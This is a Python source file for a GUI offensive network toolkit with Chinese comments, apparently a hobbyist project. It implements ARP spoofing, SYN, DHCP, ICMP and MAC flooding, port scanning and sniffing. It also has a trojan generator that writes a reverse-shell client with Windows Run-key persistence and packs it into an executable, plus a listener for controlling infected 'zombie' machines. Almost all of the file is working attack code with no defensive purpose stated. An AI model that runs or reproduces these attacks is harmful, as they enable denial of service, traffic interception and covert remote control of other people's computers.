#The program must be run in utf-8. 必须以UTF-8编码运行程序。
import time
tick = time.time()
try:
    from scapy.all import *#要用的模块有scapy没有就在命令行跑这条命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy
    from scapy.utils import PcapReader, PcapWriter
except:
    print("你是不是忘了安装scapy模块")
    print("scapy安装命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    import nmap
except:
    print("你是不是忘了安装python-nmap模块")
    print("请先在nmap的官网下载nmap www.nmap.org")
    print("如何执行指令windows:python -m pip install python-nmap liunx:sudo python -m pip install python-nmap")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtGui import *
    from PyQt5.QtCore import *
except:
    print("你是不是忘了安装PYQT5模块")
    print("如何执行指令windows:python -m pip install pyqt5 liunx:sudo python -m pip install pyqt5")
    import sys
    input("按回车退出")
    sys.exit(0) 

import random, sys, uuid, os, _thread#导入需要的自带模块
import socket as sk

class Tool_GUI(QWidget):

    def __init__(self):#GUI初始化&变量
        self.break_loop = False

        super().__init__()#GUI
        self.setGeometry(300, 300, 300, 220)
        ARP_poof_with_not_ARPping_button = QPushButton('ARP欺骗(不带主机扫描)', self)
        ARP_poof_with_not_ARPping_button.resize(ARP_poof_with_not_ARPping_button.sizeHint())
        ARP_poof_with_not_ARPping_button.move(0, 25)
        ARP_poof_with_not_ARPping_button.clicked.connect(self.ARP_poof_with_not_ARPping)
        ARP_poof_button = QPushButton('ARP欺骗(带主机扫描)', self)
        ARP_poof_button.resize(ARP_poof_button.sizeHint())
        ARP_poof_button.move(0, 50)
        ARP_poof_button.clicked.connect(self.ARP_poof)
        SYN_flood_button = QPushButton('SYN洪水', self)
        SYN_flood_button.resize(SYN_flood_button.sizeHint())
        SYN_flood_button.move(0, 0)
        SYN_flood_button.clicked.connect(self.SYN_flood)
        nmap_port_scan_button = QPushButton('端口扫描', self)
        nmap_port_scan_button.resize(nmap_port_scan_button.sizeHint())
        nmap_port_scan_button.move(0, 75)
        nmap_port_scan_button.clicked.connect(self.nmap_port_scan)
        QToolTip.setFont(QFont('SansSerif', 10))
        self.setWindowTitle('工具制作者:marko1616 bili:space.bilibili.com/385353604')
        reply = QMessageBox.question(self, '注意',
            "所有攻击都可以按ESC停止", QMessageBox.Yes | 
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            pass
        else:
            sys.exit()
        self.show()

    def keyPressEvent(self, e):
        
        if e.key() == Qt.Key_Escape:
            self.break_loop = True

    def ARP_poof_with_not_ARPping(self):#ARP欺骗不带ARPPing

        target = QInputDialog.getText(self, 'IP','请输入目标IP列:127.0.0.1')
        router = QInputDialog.getText(self, 'IP','请输入路由器IP列:192.168.3.1')
        target = str(target[0])
        router = str(router[0])

        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
        packet_two = Ether()/ARP(psrc=target,pdst=router)

        while True:#攻击主循环
            QApplication.processEvents()
            try:
                if self.break_loop == True:
                    QMessageBox.question(self, '注意',
            "攻击已停止", QMessageBox.Yes | 
            QMessageBox.No, QMessageBox.No)
                    self.break_loop = False
                    break
                sendp(packet)
                sendp(packet_two)
            except KeyboardInterrupt:
                break

    def ARP_poof(self): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活

        target = QInputDialog.getText(self, 'IP','请输入目标IP列:127.0.0.1')
        router = QInputDialog.getText(self, 'IP','请输入路由器IP列:192.168.3.1')
        target = str(target[0])
        router = str(router[0])

        arp_Ping_fall = False#初始化变量
        arp_test = False
        arp_test_two = False

        print("Try to arpPing the target...")
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
        for snd,rcv in ans:
            print("arpPing...Done")
            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
            arp_test = True

        print("Try to arpPing the router...")
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
        for snd,rcv in ans:
            print("arpPing...Done")
            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
            arp_test_two = True

        if arp_test == False or arp_test_two == False:
            arp_Ping_fall = True
            print("ARP ping fall.")

        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
        packet_two = Ether()/ARP(psrc=target,pdst=router)

        while True:#攻击主循环
            QApplication.processEvents()
            try:
                if self.break_loop == True:
                    QMessageBox.question(self, '注意',
            "攻击已停止", QMessageBox.Yes | 
            QMessageBox.No, QMessageBox.No)
                    self.break_loop = False
                    break
                if arp_Ping_fall:
                    break
                sendp(packet)
                sendp(packet_two)
            except KeyboardInterrupt:
                break

    def SYN_flood(self): #SYN flood attack SYN洪水不用我说把

        target = QInputDialog.getText(self, 'IP','请输入目标IP列:127.0.0.1:')
        port = QInputDialog.getText(self, 'Port','请输入攻击端口:')
        target = str(target[0])
        port = int(str(port[0]))

        while True:#攻击主循环
            QApplication.processEvents()
            if self.break_loop == True:
                QMessageBox.question(self, '注意',
            "攻击已停止", QMessageBox.Yes | 
            QMessageBox.No, QMessageBox.No)
                self.break_loop = False
                break
            try:#一个ctrl + c退出模块自己体会
                send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
            except KeyboardInterrupt:
                break

    def nmap_port_scan(self):#nmap扫描所有端口状态
        target = QInputDialog.getText(self, 'IP','请输入目标IP列:127.0.0.1:')
        nm = nmap.PortScanner()
        tick = time.time()
        nm.scan(str(target[0]), '1-9999')
        print("scan in ", time.time() - tick, "seconds.")
        for host in nm.all_hosts():#在nmap的扫描结果里的所有主机进行分析
            print('-----------------------------------')
            print('Host:%s(%s)'%(host,nm[host].hostname()))#打印计算机名称
            print('State:%s'%nm[host].state())
            for proto in nm[host].all_protocols():
                print('-----------------------------------')
                print('Protocol:%s'%proto)
                lport = list(nm[host][proto].keys())
                for port in lport:
                    print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))

    def DHCP_flood(self):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(options=[("message-type","discover"),"end"])
        while True:
            try:
                srp(packet)
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def death_ping(self):
        target = input("Enter the target like 127.0.0.1:")
        while True:
            send(IP(src=target,dst=RandIP())/ICMP())

    def scapy_sniff(self):
        file = open('iface.setting','r')
        iface = file.read()
        file.close()

        if iface == 'None':
            data = sniff(prn=lambda x:x.summary())#scapy的sniff嗅探
        else:
            data = sniff(iface=iface,prn=lambda x:x.summary())

        print("Start analyzing packets...")
        file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
        writer = PcapWriter(file, append = True)
        for i in data:
            writer.write(i)
        writer.flush()
        writer.close()

    def read_pcap(self):

        file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
        file_name = "sniff_data/" + file_name#组合文件路径
        reader = PcapReader(file_name)#用scapy打开pcap文件
        packets = reader.read_all(-1)#读取所有储存的数据包
        for i in packets:#循环数据包列表
            i.show()#打印数据包

    def macof(self):
        while True:
            try:
                packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
                time.sleep(0.01)
                sendp(packet)
            except KeyboardInterrupt:
                break

    def Generate_trojan_virus(self):
        name = input("Enter virus name:")
        lhost = input("Enter connect host:")
        lport = input("Enter connect port:")
        file = open("virus/" + name + ".py",'w')
        file.write('import socket, os, time\n')
        file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')
        file.write('s = socket.socket()\n')
        file.write('s.connect(("' + lhost + '",' + lport + '))\n')
        file.write('while True:\n')
        file.write('    command = s.recv(2048)\n')
        file.write('    data = os.popen(command.decode("utf-8")).read()\n')
        file.write('    if data == "":\n')
        file.write('        data = "command has no output or has a error."\n')
        file.write('    s.send(bytes(data,encoding="utf-8"))\n')
        file.close()
        os.system("pyinstaller -F virus/" + name + ".py")

    def countrol_zombie_computer(self):
        listen_host = input("Enter the listen host ip like 127.0.0.1:")
        listen_port = input("Enter the listen port like 80:")
        s = socket.socket()
        s.bind((listen_host,int(listen_port)))
        s.listen(1)
        print("Wait for connect...")
        conn,address = s.accept()
        print("have a new connect from",address[0])
        while True:
            command = input("Enter the command:")
            conn.send(bytes(command,encoding="utf-8"))
            data = conn.recv(4096)
            print(data.decode("utf-8"))

app = QApplication(sys.argv)
Tool = Tool_GUI()
sys.exit(app.exec_()) 
